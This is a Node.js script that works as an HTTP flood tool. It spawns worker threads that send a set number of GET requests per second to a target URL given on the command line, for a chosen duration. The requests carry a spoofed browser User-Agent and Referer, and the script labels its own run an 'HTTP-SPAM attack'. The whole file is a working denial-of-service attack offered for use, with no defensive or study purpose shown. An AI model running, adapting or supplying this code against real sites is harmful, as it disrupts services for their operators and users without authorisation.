const { Worker, isMainThread, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');
const url = require('url');

if (isMainThread) {
    const targetUrl = process.argv[2];
    const packetsPerSecond = parseInt(process.argv[3]);
    const bots = parseInt(process.argv[4]);
    const threads = parseInt(process.argv[5]);
    const time = parseInt(process.argv[6]);

    const parsedUrl = new URL(targetUrl);
    const targetPort = parsedUrl.port || 80;

    console.log(`Starting HTTP-SPAM attack on ${targetUrl} with ${bots} bots, ${threads} threads, ${packetsPerSecond} PPS for ${time} seconds.`);

    for (let i = 0; i < threads; i++) {
        new Worker(__filename, {
            workerData: { targetUrl, targetPort, packetsPerSecond, time }
        });
    }
} else {
    const { targetUrl, targetPort, packetsPerSecond, time } = workerData;
    const protocol = targetUrl.startsWith('https') ? https : http;

    const sendRequests = () => {
        for (let i = 0; i < packetsPerSecond; i++) {
            const options = {
                hostname: new URL(targetUrl).hostname,
                port: targetPort,
                path: '/',
                method: 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                    'Referer': 'http://google.com',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
            };

            const req = protocol.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {});
            });

            req.on('error', (err) => {
                console.error(`Error sending request: ${err.message}`);
            });

            req.end();
        }
    };

    const interval = setInterval(sendRequests, 1000);

    setTimeout(() => {
        clearInterval(interval);
        console.log('HTTP-SPAM attack finished.');
    }, time * 1000);
}
